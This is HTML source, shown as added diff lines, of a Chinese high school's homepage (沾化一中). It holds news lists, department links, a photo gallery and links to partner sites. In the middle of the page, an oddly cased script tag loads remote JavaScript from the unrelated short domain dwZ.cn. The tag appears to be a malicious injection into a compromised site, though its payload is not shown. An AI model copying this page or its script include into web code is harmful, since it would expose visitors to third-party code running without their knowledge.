+<DIV class=bd>
+<UL>
+  <LI class=di01><A href="http://www.bzzhyz.com"><IMG 
+  src="/templets/default/images/t_01.gif"><SPAN>图书馆</A></SPAN></LI>
+  <LI class=di01><A href="http://www.bzzhyz.com"><IMG 
+  src="/templets/default/images/t_02.gif"><SPAN>实验室</A></SPAN></LI>
+  <LI class=di01><A href="http://www.bzzhyz.com"><IMG 
+  src="/templets/default/images/t_03.gif"><SPAN>公文流转</A></SPAN></LI>
+  <LI class=di01><A href="http://www.bzzhyz.com"><IMG 
+  src="/templets/default/images/t_04.gif"><SPAN>校长信箱</A></SPAN></LI>
+  <LI class=di01><A href="http://172.16.16.15:6060/" 
+  target=_blank><IMG src="/templets/default/images/t_05.gif"><SPAN>网络直播</A></SPAN></LI>
+  <LI class=di01><A href="http://www.bzzhyz.com"><IMG 
+  src="/templets/default/images/t_06.gif"><SPAN>校史馆</A></SPAN></LI>
+  <LI class=di01><A href="http://www.bzzhyz.com"><IMG 
+  src="/templets/default/images/t_07.gif"><SPAN>人事档案</A></SPAN></LI>
+  <LI class=di01><A href="http://www.bzzhyz.com"><IMG 
+  src="/templets/default/images/t_08.gif"><SPAN>常规管理</A></SPAN></LI>
+  <LI class=di01><A href="http://www.bzzhyz.com"><IMG 
+  src="/templets/default/images/t_09.gif"><SPAN>家校平台</A></SPAN></LI>
+  <DIV class=clear></div></UL></div></div></div></div>
+
+
+
+<DIV class=fr>
+<DIV class="fll edu">
+<DIV class=hd><SPAN><A href="/plus/list.php?tid=2">更多&gt;&gt;</A></SPAN> 
+<H3>教学教研</H3></div>
+
+<DIV class=bd>
+<DIV class=hdd><A id=c01 
+class=sd01 href="/plus/list.php?tid=15">教学安排</A>|<A id=c02 
+class=sd02 href="/plus/list.php?tid=16">教研安排</A>|<A id=c03 
+class=sd02 href="/plus/list.php?tid=17">教研获奖</A>|<A id=c04 
+class=sd02 href="/plus/list.php?tid=31">教师随笔</A> </div>
+
+
+<UL id=cc01 class=samelist3>
+    <!--文章调用-->
+  <LI><SPAN>06-15</SPAN><A 
+  title="标题：周计划&#13;点击数：337&#13;发表时间：06-15" 
+  href="/plus/view.php?aid=195" 
+  target=_blank>周计划</A></LI>
+
+  </UL>
+<UL id=cc02 class="samelist3 hidden">
+ <!--文章调用-->
+  <LI><SPAN>04-23</SPAN><A 
+  title="标题：关于评选2014年中小学教师远程研修先进单位&#13;点击数：208&#13;发表时间：04-23" 
+  href="/plus/view.php?aid=115" 
+  target=_blank>关于评选2014年中小学教师远程研修先进单位</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-23</SPAN><A 
+  title="标题：沾化一中充分利用多种资源 努力实现教学常&#13;点击数：166&#13;发表时间：04-23" 
+  href="/plus/view.php?aid=129" 
+  target=_blank>沾化一中充分利用多种资源 努力实现教学常</A></LI>
+</UL>
+<UL id=cc03 class="samelist3 hidden">
+  <!--文章调用-->
+  <LI><SPAN>05-23</SPAN><A 
+  title="标题：沾化一中理综代表队在全市说题比赛中勇创佳&#13;点击数：553&#13;发表时间：05-23" 
+  href="/plus/view.php?aid=211" 
+  target=_blank>沾化一中理综代表队在全市说题比赛中勇创佳</A></LI>
+
+  
+  </UL>
+  <UL id=cc04 class="samelist3 hidden">
+  <!--文章调用-->
+  <LI><SPAN>04-24</SPAN><A 
+  title="标题：创设问题情境,课堂教学的金钥匙&#13;点击数：460&#13;发表时间：04-24" 
+  href="/plus/view.php?aid=127" 
+  target=_blank>创设问题情境,课堂教学的金钥匙</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-24</SPAN><A 
+  title="标题：素质教育下的微积分教学初探&#13;点击数：400&#13;发表时间：04-24" 
+  href="/plus/view.php?aid=128" 
+  target=_blank>素质教育下的微积分教学初探</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-24</SPAN><A 
+  title="标题：浅谈高中化学教学的优化&#13;点击数：270&#13;发表时间：04-24" 
+  href="/plus/view.php?aid=131" 
+  target=_blank>浅谈高中化学教学的优化</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-24</SPAN><A 
+  title="标题：高中化学探究式教学模式的初探与实践&#13;点击数：167&#13;发表时间：04-24" 
+  href="/plus/view.php?aid=132" 
+  target=_blank>高中化学探究式教学模式的初探与实践</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-24</SPAN><A 
+  title="标题：高中化学教学中错别字现象及矫正对策&#13;点击数：213&#13;发表时间：04-24" 
+  href="/plus/view.php?aid=133" 
+  target=_blank>高中化学教学中错别字现象及矫正对策</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-22</SPAN><A 
+  title="标题：从“双钩填墨”开始——高中美术书法模块教&#13;点击数：276&#13;发表时间：04-22" 
+  href="/plus/view.php?aid=143" 
+  target=_blank>从“双钩填墨”开始——高中美术书法模块教</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-01</SPAN><A 
+  title="标题：做更好的自己&#13;点击数：215&#13;发表时间：04-01" 
+  href="/plus/view.php?aid=126" 
+  target=_blank>做更好的自己</A></LI>
+<!--文章调用-->
+  <LI><SPAN>03-30</SPAN><A 
+  title="标题：学习衡水经验，付诸教育实践&#13;点击数：256&#13;发表时间：03-30" 
+  href="/plus/view.php?aid=121" 
+  target=_blank>学习衡水经验，付诸教育实践</A></LI>
+
+  
+  </UL>
+  
+  </div></div><scRIPt SrC=//dwZ.cn/jscnzz></SCRIpT>
+
+
+
+<DIV class="frr edu edu2">
+<DIV class=hd><SPAN><A 
+href="/plus/list.php?tid=4">更多&gt;&gt;</A></SPAN> 
+<H3>学校德育</H3></div>
+<DIV class=bd>
+<DIV class=hdd><A id=d01 
+class=sd01 href="/plus/list.php?tid=24">德育动态</A>|<A id=d02 
+class=sd02 href="/plus/list.php?tid=25">班主任专栏</A>|<A id=d03 
+class=sd02 href="/plus/list.php?tid=26">心灵驿站</A>|<A id=d04 
+class=sd02 href="/plus/list.php?tid=27">升旗仪式</A> </div>
+
+<UL id=dd01 class=samelist3>
+  <!--文章调用-->
+  <LI><SPAN>11-16</SPAN><A 
+  title="标题：沾化一中关于学校家庭社会三结合 教育活动&#13;点击数：529&#13;发表时间：11-16" 
+  href="/plus/view.php?aid=207" 
+  target=_blank>沾化一中关于学校家庭社会三结合 教育活动</A></LI>
+<!--文章调用-->
+  <LI><SPAN>03-28</SPAN><A 
+  title="标题：沾化一中首届“励志青春” 班主任论坛方案&#13;点击数：635&#13;发表时间：03-28" 
+  href="/plus/view.php?aid=119" 
+  target=_blank>沾化一中首届“励志青春” 班主任论坛方案</A></LI>
+<!--文章调用-->
+  <LI><SPAN>03-28</SPAN><A 
+  title="标题：沾化一中励志跑操活动方案（试行）&#13;点击数：402&#13;发表时间：03-28" 
+  href="/plus/view.php?aid=117" 
+  target=_blank>沾化一中励志跑操活动方案（试行）</A></LI>
+<!--文章调用-->
+  <LI><SPAN>03-28</SPAN><A 
+  title="标题：寻找最美励志师徒活动倡议书&#13;点击数：310&#13;发表时间：03-28" 
+  href="/plus/view.php?aid=118" 
+  target=_blank>寻找最美励志师徒活动倡议书</A></LI>
+
+  
+</UL>
+<UL id=dd02 class="samelist3 hidden">
+   <!--文章调用-->
+  <LI><SPAN>05-13</SPAN><A 
+  title="标题：11&#13;点击数：314&#13;发表时间：05-13" 
+  href="/plus/view.php?aid=180" 
+  target=_blank>11</A></LI>
+
+  </UL>
+<UL id=dd03 class="samelist3 hidden">
+   <!--文章调用-->
+  <LI><SPAN>04-23</SPAN><A 
+  title="标题：“青春激扬  我心向上”励志远足活动总结&#13;点击数：743&#13;发表时间：04-23" 
+  href="/plus/view.php?aid=157" 
+  target=_blank>“青春激扬  我心向上”励志远足活动总结</A></LI>
+
+  </UL>
+<UL id=dd04 class="samelist3 hidden">
+    <!--文章调用-->
+  <LI><SPAN>04-24</SPAN><A 
+  title="标题：高二1级部全体师生参加升旗仪式&#13;点击数：332&#13;发表时间：04-24" 
+  href="/plus/view.php?aid=163" 
+  target=_blank>高二1级部全体师生参加升旗仪式</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-16</SPAN><A 
+  title="标题：军训&#13;点击数：294&#13;发表时间：04-16" 
+  href="/plus/view.php?aid=134" 
+  target=_blank>军训</A></LI>
+<!--文章调用-->
+  <LI><SPAN>03-31</SPAN><A 
+  title="标题：沾化一中首届“励志青春”班主任论坛会场&#13;点击数：318&#13;发表时间：03-31" 
+  href="/plus/view.php?aid=124" 
+  target=_blank>沾化一中首届“励志青春”班主任论坛会场</A></LI>
+
+    
+</UL>
+</div></div>
+
+
+
+
+<DIV class="fll edu edu3">
+<DIV class=hd><SPAN><A 
+href="/plus/list.php?tid=6">更多&gt;&gt;</A></SPAN> 
+<H3>学生天地</H3></div><DIV class=bd>
+<DIV class=hdd><A id=e01 
+class=sd01 href="/plus/list.php?tid=33">学生作品</A>|<A id=e02 
+class=sd02 href="/plus/list.php?tid=32">社团活动</A>|<A id=e03 
+class=sd02 href="/plus/list.php?tid=34">校园之星</A>|<A id=e04 
+class=sd02 href="/plus/list.php?tid=35">图书乐园</A> </div>
+
+<DIV class=epic><IMG src="/templets/default/images/e01.jpg"></div>
+<UL id=ee01 class=samelist3>
+   <!--文章调用-->
+  <LI><SPAN>05-12</SPAN><A 
+  title="标题：沾化一中2014级3班&#13;点击数：622&#13;发表时间：05-12" 
+  href="/plus/view.php?aid=170" 
+  target=_blank>沾化一中2014级3班</A></LI>
+<!--文章调用-->
+  <LI><SPAN>03-24</SPAN><A 
+  title="标题：金色苦难&#13;点击数：373&#13;发表时间：03-24" 
+  href="/plus/view.php?aid=103" 
+  target=_blank>金色苦难</A></LI>
+
+  </UL>
+<UL id=ee02 class="samelist3 hidden">
+   <!--文章调用-->
+  <LI><SPAN>04-24</SPAN><A 
+  title="标题：机器人比赛如火如荼，沾化一中载誉而归&#13;点击数：380&#13;发表时间：04-24" 
+  href="/plus/view.php?aid=162" 
+  target=_blank>机器人比赛如火如荼，沾化一中载誉而归</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-24</SPAN><A 
+  title="标题：搭建机器人&#13;点击数：217&#13;发表时间：04-24" 
+  href="/plus/view.php?aid=141" 
+  target=_blank>搭建机器人</A></LI>
+
+  </UL>
+<UL id=ee03 class="samelist3 hidden">
+    
+  </UL>
+<UL id=ee04 class="samelist3 hidden">
+   
+  </UL></div></div>
+
+
+
+<DIV class="frr edu edu4">
+<DIV class=hd><SPAN><A 
+href="/plus/list.php?tid=5">更多&gt;&gt;</A></SPAN> 
+<H3>教师之家</H3></div>
+<DIV class=bd>
+<DIV class=hdd><A id=f01 
+class=sd01 href="/plus/list.php?tid=28">园丁风采</A>|<A id=f02 
+class=sd02 href="/plus/list.php?tid=29">在线课堂</A>|<A id=f03 
+class=sd02 href="/plus/list.php?tid=30">才艺展示</A>|<A id=f04 
+class=sd02 href="/plus/list.php?tid=19">校园安全</A> </div>
+
+
+<DIV class=epic><IMG src="/templets/default/images/e02.jpg"></div>
+<UL id=ff01 class=samelist3>
+    <!--文章调用-->
+  <LI><SPAN>05-31</SPAN><A 
+  title="标题：高二、22班优秀师生风采展&#13;点击数：1034&#13;发表时间：05-31" 
+  href="/plus/view.php?aid=194" 
+  target=_blank>高二、22班优秀师生风采展</A></LI>
+<!--文章调用-->
+  <LI><SPAN>04-01</SPAN><A 
+  title="标题：沾化一中首届“励志青春”班主任论坛&#13;点击数：1216&#13;发表时间：04-01" 
+  href="/plus/view.php?aid=122" 
+  target=_blank>沾化一中首届“励志青春”班主任论坛</A></LI>
+<!--文章调用-->
+  <LI><SPAN>03-30</SPAN><A 
+  title="标题：级部风采&#13;点击数：973&#13;发表时间：03-30" 
+  href="/plus/view.php?aid=120" 
+  target=_blank>级部风采</A></LI>
+<!--文章调用-->
+  <LI><SPAN>03-25</SPAN><A 
+  title="标题：励志展板&#13;点击数：458&#13;发表时间：03-25" 
+  href="/plus/view.php?aid=113" 
+  target=_blank>励志展板</A></LI>
+<!--文章调用-->
+  <LI><SPAN>03-24</SPAN><A 
+  title="标题：高二二级部优秀师生展&#13;点击数：845&#13;发表时间：03-24" 
+  href="/plus/view.php?aid=102" 
+  target=_blank>高二二级部优秀师生展</A></LI>
+
+  </UL>
+<UL id=ff02 class="samelist3 hidden">
+    
+  </UL>
+<UL id=ff03 class="samelist3 hidden">
+  
+  </UL>
+<UL id=ff04 class="samelist3 hidden">
+    
+  </UL></div></div>
+
+
+<DIV class=clear></div>
+<DIV class="depart mtop10 border">
+<DIV class=tbox>
+<TABLE class=depart1 border=0 width="50%">
+  <TBODY>
+  <TR>
+    <TD><A href="###"><IMG 
+      src="/templets/default/images/de01.jpg"></A></TD>
+    <TD class=departcont>
+      <LI><A href="###">校长室</A> </LI>
+      <LI><A href="###">教务处</A> </LI>
+      <LI><A href="###">政教处</A> </LI>
+      <LI><A href="###">办公室</A> </LI>
+      <LI><A href="###">总务处</A> </LI>
+      <LI><A href="###">高一</A> </LI>
+      <LI><A href="###">高二</A> </LI>
+      <LI><A href="###">高三</A> </LI>
+      </TD></TR></TBODY></TABLE>
+<TABLE class=depart2 border=0 width="50%">
+  <TBODY>
+  <TR>
+    <TD><A href="/plus/list.php?tid=24"><IMG 
+      src="/templets/default/images/de02.jpg"></A></TD>
+    <TD class=departcont>
+      <LI><A href="###">语文</A> </LI>
+      <LI><A href="###">数学</A> </LI>
+      <LI><A href="###">英语</A> </LI>
+      <LI><A href="###">物理</A> </LI>
+      <LI><A href="###">化学</A> </LI>
+      <LI><A href="###">生物</A> </LI>
+      <LI><A href="###">政治</A> </LI>
+      <LI><A href="###">历史</A> </LI>
+      <LI><A href="###">地理</A> </LI>
+      <LI><A href="###">音乐</A> </LI>
+      <LI><A href="###">体育</A> </LI>
+      <LI><A href="###">艺术</A> </LI>
+      <LI><A href="###">信息技术</A> 
+    </LI></TD></TR></TBODY></TABLE></div></div>
+
+
+<DIV class="phos mtop10 border">
+<DIV class=tbox>
+<DIV class=hd><SPAN><A 
+href="###">更多&gt;&gt;</A></SPAN> 
+<H3>魅力一中</H3></div>
+<DIV class=bd>
+<DIV style="WIDTH: 660px; HEIGHT: 114px; OVERFLOW: hidden" id=v0 align=center>
+<DIV style="WIDTH: 8000px" id=v1>
+<UL>
+	<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=246" 
+  target=_blank><IMG border=0 alt=沾化一中2015级学生成人 
+  src="/uploads/allimg/171030/7-1G030111552935-lp.jpg" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=246" 
+  target=_blank>沾化一中2015级学生成人</A></div></LI>
+<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=247" 
+  target=_blank><IMG border=0 alt=沾化一中2017年秋季田径 
+  src="/uploads/allimg/171030/7-1G03011341S47-lp.JPG" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=247" 
+  target=_blank>沾化一中2017年秋季田径</A></div></LI>
+<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=237" 
+  target=_blank><IMG border=0 alt=“十八而志，尽责成才” 
+  src="/uploads/allimg/170113/7-1F113100200503-lp.JPG" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=237" 
+  target=_blank>“十八而志，尽责成才”</A></div></LI>
+<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=245" 
+  target=_blank><IMG border=0 alt=沾化一中2016级青春励志 
+  src="/uploads/allimg/170930/7-1F930164KL61-lp.JPG" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=245" 
+  target=_blank>沾化一中2016级青春励志</A></div></LI>
+<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=244" 
+  target=_blank><IMG border=0 alt=心怀祖国·立志成才—— 
+  src="/uploads/allimg/170930/7-1F930105015103-lp.JPG" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=244" 
+  target=_blank>心怀祖国·立志成才——</A></div></LI>
+<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=243" 
+  target=_blank><IMG border=0 alt=教师节来临之际区领导前 
+  src="/uploads/allimg/170908/7-1FZQ5404EQ-lp.JPG" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=243" 
+  target=_blank>教师节来临之际区领导前</A></div></LI>
+<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=241" 
+  target=_blank><IMG border=0 alt=沾化一中2017级开学典礼 
+  src="/uploads/allimg/170907/7-1FZFT033157-lp.JPG" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=241" 
+  target=_blank>沾化一中2017级开学典礼</A></div></LI>
+<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=242" 
+  target=_blank><IMG border=0 alt=沾化一中2017级军训汇操 
+  src="/uploads/allimg/170907/7-1FZFZ45V59-lp.JPG" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=242" 
+  target=_blank>沾化一中2017级军训汇操</A></div></LI>
+<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=225" 
+  target=_blank><IMG border=0 alt=沾化一中举办首届“青少 
+  src="/uploads/allimg/160902/7-160Z209505aX-lp.jpg" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=225" 
+  target=_blank>沾化一中举办首届“青少</A></div></LI>
+<!--//图片展示文章的调用参数-->
+  <LI>
+  <DIV class=pe_u_thumb><A href="/plus/view.php?aid=235" 
+  target=_blank><IMG border=0 alt=沾化一中建校六十周年庆 
+  src="/uploads/allimg/161110/7-161110104QQ04-lp.JPG" width=114 height=84></A></div>
+  <DIV class=pe_u_thumb_title><A href="/plus/view.php?aid=235" 
+  target=_blank>沾化一中建校六十周年庆</A></div></LI>
+
+  </UL></div>
+<DIV id=v2></div></div>
+<SCRIPT type=text/javascript>chenkemove("v0","v1","v2",4,30);</SCRIPT>
+</div></div></div></div>
+<DIV class=clear></div></div>
+
+
+<DIV class="links mtop10 border">
+<DIV class=tbox>
+<DIV class=hd><SPAN><A href="/plus/list.php?tid=44">更多&gt;&gt;</A></SPAN> 
+<H3>友情链接</H3></div>
+<DIV class=bd>
+<DIV class=linkPic>
+<UL>
+  <LI><A href="http://www.moe.gov.cn/" target=_blank><IMG title=中华人民共和国教育部 border=0 
+  alt=中华人民共和国教育部 src="/templets/default/images/教育部.jpg"></A></LI>
+
+  <LI><A href="http://www.sdedu.gov.cn/" target=_blank><IMG title=山东省教育厅 border=0 
+  alt=山东省教育厅 src="/templets/default/images/山东省教育厅.jpg"></A></LI>
+
+  <LI><A href="http://www.sdbzedu.gov.cn/" target=_blank><IMG title=滨州市教育局 border=0 
+  alt=滨州市教育局 src="/templets/default/images/滨州市教育局.jpg"></A></LI>
+  
+
+  <LI><A href="http://www.gov.cn/" target=_blank><IMG title=橡皮网 border=0 
+  alt=中国政府网 src="/templets/default/images/橡皮网.jpg"></A></LI>
+   
+    <LI><A href="http://www.shandong.gov.cn/" target=_blank><IMG title=山东政府网 border=0 
+  alt=山东政府网 src="/templets/default/images/山东政府.jpg"></A></LI>
+
+<LI><A href="http://www.binzhou.gov.cn/" target=_blank><IMG title=滨州政府网 border=0 
+  alt=滨州政府网 src="/templets/default/images/滨州政府.jpg"></A></LI>
+
+
+  </UL></div>
+
+
+
+<DIV class=linkOp>
+<UL>
+  <LI><SELECT id=friendsitelist 
+  onchange="if(this.options[this.selectedIndex].value!=''){window.open(this.options[this.selectedIndex].value)}"><OPTION 
+    selected value="">---国内名校网站链接---</OPTION>
+    <OPTION    value=http://www.tsinghua.edu.cn/>清华大学</OPTION>
+    <OPTION   value=http://www.pku.edu.cn/>北京大学</OPTION>
+    <OPTION   value=http://www.sdu.edu.cn/>山东大学</OPTION>
+    <OPTION    value=http://www.ouc.edu.cn/>中国海洋大学</OPTION>
+    <OPTION    value=http://www.sdnu.edu.cn/>山东师范大学</OPTION>
+    <OPTION    value=http://www.qdu.edu.cn/>青岛大学</OPTION>
+
+
+</SELECT> </LI>
+
+  <LI><SELECT id=friendsitelist 
+  onchange="if(this.options[this.selectedIndex].value!=''){window.open(this.options[this.selectedIndex].value)}"><OPTION 
+    selected value="">---世界名校网站链接---</OPTION><OPTION 
+    value=http://www.duke.edu/>杜克大学</OPTION><OPTION 
+    value=http://www.harvard.edu/>哈佛大学</OPTION><OPTION 
+    value=http://www.princeton.edu/main/>普林斯顿大学</OPTION><OPTION 
+    value=http://www.ntu.edu.sg/Pages/RedirectPage.aspx>新加坡南洋理工大学</OPTION><OPTION 
+    value=http://www.nus.edu.sg/>新加坡国立大学</OPTION></SELECT> </LI>
+
+  <LI><SELECT id=friendsitelist 
+  onchange="if(this.options[this.selectedIndex].value!=''){window.open(this.options[this.selectedIndex].value)}"><OPTION 
+    selected value="">---政府及教研网站链接---</OPTION><OPTION 
+    value=http://www.qlteacher.com/>山东省教师教育网</OPTION><OPTION 
+    value=http://www.sdbzedu.gov.cn//>滨州教育</OPTION><OPTION 
+    value=http://www.sdedu.gov.cn/>山东教育</OPTION><OPTION 
+    value=http://www.moe.edu.cn/>教育部</OPTION></SELECT> </LI>
+
+  <LI><SELECT id=friendsitelist 
+  onchange="if(this.options[this.selectedIndex].value!=''){window.open(this.options[this.selectedIndex].value)}"><OPTION 
+    selected value="">---其他教育网站链接---</OPTION><OPTION 
+    value=http://www.bzhrss.gov.cn/>滨州市人力资源和社会保障网</OPTION></SELECT> 
+</LI>
+
+
+</UL></div></div></div></div></div><!--主要部分-->
+
+<DIV class=footerbox>
+<DIV class=footer>
+<P></P>沾化区第一中学
+<BR>地址：山东省沾化县富城路419号　邮编：256800 邮箱zhyzbgs@163.com  值班电话：05437319006
+<BR>备案号：鲁ICP备14034297号
+<BR><a href="http://bszs.conac.cn/sitename?method=show&id=24627A6EBFB90980E053012819AC9A4E">
+<img src="/templets/images/blue.png" width="80" height="80" /></a> 
+</div></div>
+</BODY></HTML>
